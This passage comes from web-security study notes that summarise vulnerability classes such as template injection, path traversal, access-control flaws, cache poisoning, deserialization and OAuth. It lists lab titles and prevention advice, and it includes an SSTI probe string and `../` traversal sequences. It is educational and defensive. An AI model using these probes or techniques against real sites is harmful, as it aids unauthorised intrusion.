-   Validating against a whitelist of permitted values.
-   Validating that the input is a number.
-   Validating that the input contains only alphanumeric characters, no other syntax or whitespace.

But keep in mind that even if you do those 3 checks, you can still be in danger without changing your handling.


## Server-side template injection

Server-side template injection (SSTI) is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

You can try to detect the presence of SSTI by using template related caracteres and look for errors. Those caracteres could be one or multiple of them `${{<%[%'"}}%\`.

If you detect a potential SSTI you can explore the appropriate injection to perform by idenfying the template use. You can follow this diagram to find it :

![Template decision tree](https://portswigger.net/web-security/images/template-decision-tree.png)


#### Basics

- Basic server-side template injection
- Basic server-side template injection (code context)



#### Advance

- Server-side template injection in a sandboxed environment
- Server-side template injection with a custom exploit


#### Other examples

- Server-side template injection using documentation
- Server-side template injection in an unknown language with a documented exploit
- Server-side template injection with information disclosure via user-supplied objects


#### How to prevent them 

One of the simplest ways to avoid introducing server-side template injection vulnerabilities is to always use a "logic-less" template engine, such as Mustache, unless absolutely necessary. Separating the logic from presentation as much as possible can greatly reduce your exposure to the most dangerous template-based attacks.

Another measure is to only execute users' code in a sandboxed environment where potentially dangerous modules and functions have been removed altogether. Unfortunately, sandboxing untrusted code is inherently difficult and prone to bypasses.

Finally, another complementary approach is to accept that arbitrary code execution is all but inevitable and apply your own sandboxing by deploying your template environment in a locked-down Docker container, for example.


## Directory traversal

Directory traversal aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with `../` sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.


#### Some examples

- File path traversal, simple case
- File path traversal, traversal sequences blocked with absolute path bypass
- File path traversal, traversal sequences stripped non-recursively
- File path traversal, traversal sequences stripped with superfluous URL-decode
- File path traversal, validation of start of path
- File path traversal, validation of file extension with null byte bypass


#### How to prevent them

-   Prefer working without user input when using file system calls
-   Ensure the user cannot supply all parts of the path – surround it with your path code
-   Validate the user’s input by only accepting known good – do not sanitize the data
-   Use chrooted jails and code access policies to restrict where the files can be obtained or saved to
-   If forced to use user input for file operations, normalize the input before using in file io API’s, such as [normalize()](https://docs.oracle.com/javase/7/docs/api/java/net/URI.html#normalize()).


## Access control vulnerabilities

Access control is a family where the web app you are in doesn't implement a sufficiant control of rights / access and in that way you can perform actions that you shouldn't be able to perform. A good system should contain all of these points :

-   **Authentication** identifies the user and confirms that they are who they say they are.
-   **Session management** identifies which subsequent HTTP requests are being made by that same user.
-   **Access control** determines whether the user is allowed to carry out the action that they are attempting to perform.

This vulnerability can be split between 3 catégories as follow :
-   **Vertical access controls** : User can perform action that is not allowed for there roles or types of users
-   **Horizontal access controls** : User can access or modify data that can only be accessible to a specific user
-   **Context-dependent access controls** : A little mix between the previous ones

#### Some examples

- Unprotected admin functionality
- Unprotected admin functionality with unpredictable URL
- User role controlled by request parameter
- User role can be modified in user profile
- URL-based access control can be circumvented
- Method-based access control can be circumvented
- User ID controlled by request parameter 
- User ID controlled by request parameter, with unpredictable user IDs
		
- User ID controlled by request parameter with data leakage in redirect 
- User ID controlled by request parameter with password disclosure
- Insecure direct object references
- Multi-step process with no access control on one step
		
- Referer-based access control


#### How to prevent them

-   Never rely on obfuscation alone for access control.
-   Unless a resource is intended to be publicly accessible, deny access by default.
-   Wherever possible, use a single application-wide mechanism for enforcing access controls.
-   At the code level, make it mandatory for developers to declare the access that is allowed for each resource, and deny access by default.
-   Thoroughly audit and test access controls to ensure they are working as designed.


		
## Authentication

This one is a very large topic. Basicly this category is everything related to authentication on web apps. You can check for this vulnerability by checking potential:
-   weak authentication mechanisms because they fail to adequately protect against brute-force attacks.
-   Logic flaws or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. 


#### Some examples

- Username enumeration via different responses
- Username enumeration via subtly different responses
- Username enumeration via response timing
- Broken brute-force protection, IP block
- Username enumeration via account lock
- Broken brute-force protection, multiple credentials per request
- 2FA simple bypass
- 2FA broken logic
- 2FA bypass using a brute-force attack
- Brute-forcing a stay-logged-in cookie
- Offline password cracking
- Password reset broken logic
- Password reset poisoning via middleware
- Password brute-force via password change


#### How to prevent them

- Implement reliable techniques
- Force HTTPS
- Prevent username fuzzing
- Multi-factor authentification
- ...


## WebSockets

WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.

As well as manipulating WebSocket messages, it is sometimes necessary to manipulate the WebSocket Handshake that establishes the connection.

There are various situations in which manipulating the WebSocket handshake might be necessary:

-   It can enable you to reach more attack surface.
-   Some attacks might cause your connection to drop so you need to establish a new one.
-   Tokens or other data in the original handshake request might be stale and need updating.

#### Some examples

- Manipulating WebSocket messages to exploit vulnerabilities
- Manipulating the WebSocket handshake to exploit vulnerabilities
- Cross-site WebSocket hijacking


#### How to prevent them

 To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines:

   - Use the wss:// protocol (WebSockets over TLS).
   - Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
   - Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
   - Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.



## Web cache poisoning

Web cache poisoning involves two phases:
-	The attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload.
-	They need to make sure that their response is cached and subsequently served to the intended victims.

A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.

Here is a schema of the attack.

![web cache poisoning](https://portswigger.net/web-security/images/cache-poisoning.svg)


#### Some examples

- Web cache poisoning with an unkeyed header
- Web cache poisoning with an unkeyed cookie
- Web cache poisoning with multiple headers
- Targeted web cache poisoning using an unknown header
- Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
- Combining web cache poisoning vulnerabilities
- Web cache poisoning via an unkeyed query string
- Web cache poisoning via an unkeyed query parameter
- Parameter cloaking
- Web cache poisoning via a fat GET request
- URL normalization
- Cache key injection
- Internal cache poisoning


#### How to prevent them

-   If you are considering excluding something from the cache key for performance reasons, rewrite the request instead.
-   Don't accept fat `GET` requests. Be aware that some third-party technologies may permit this by default.
-   Patch client-side vulnerabilities even if they seem unexploitable. Some of these vulnerabilities might actually be exploitable due to unpredictable quirks in your cache's behavior. It could be a matter of time before someone finds a quirk, whether it be cache-based or otherwise, that makes this vulnerability exploitable.


## Insecure deserialization

Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

It is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an "object injection" vulnerability.


#### Some examples

- Modifying serialized objects
- Modifying serialized data types
- Using application functionality to exploit insecure deserialization
- Arbitrary object injection in PHP
- Exploiting Java deserialization with Apache Commons
- Exploiting PHP deserialization with a pre-built gadget chain
- Exploiting Ruby deserialization using a documented gadget chain
- Developing a custom gadget chain for Java deserialization
- Developing a custom gadget chain for PHP deserialization
- Using PHAR deserialization to deploy a custom gadget chain


## Information disclosure

Information disclosure, also known as information leakage, is when a website unintentionally reveals sensitive information to its users. Depending on the context, websites may leak all kinds of information to a potential attacker, including:

-   Data about other users, such as usernames or financial information
-   Sensitive commercial or business data
-   Technical details about the website and its infrastructure


#### Some examples

- Information disclosure in error messages
- Information disclosure on debug page
- Source code disclosure via backup files
- Authentication bypass via information disclosure
- Information disclosure in version control history


## HTTP Host header attacks

can lead to :

-   Web cache poisoning
-   Business [logic flaws](https://portswigger.net/web-security/logic-flaws) in specific functionality
-   Routing-based SSRF
-   Classic server-side vulnerabilities, such as SQL injection

- Basic password reset poisoning
- Password reset poisoning via dangling markup
- Web cache poisoning via ambiguous requests
- Host header authentication bypass
- Routing-based SSRF
- SSRF via flawed request parsing


## OAuth authentication

System of social login

- Authentication bypass via OAuth implicit flow
- Forced OAuth profile linking
- OAuth account hijacking via redirect_uri
- Stealing OAuth access tokens via an open redirect
- Stealing OAuth access tokens via a proxy page
- SSRF via OpenID dynamic client registration


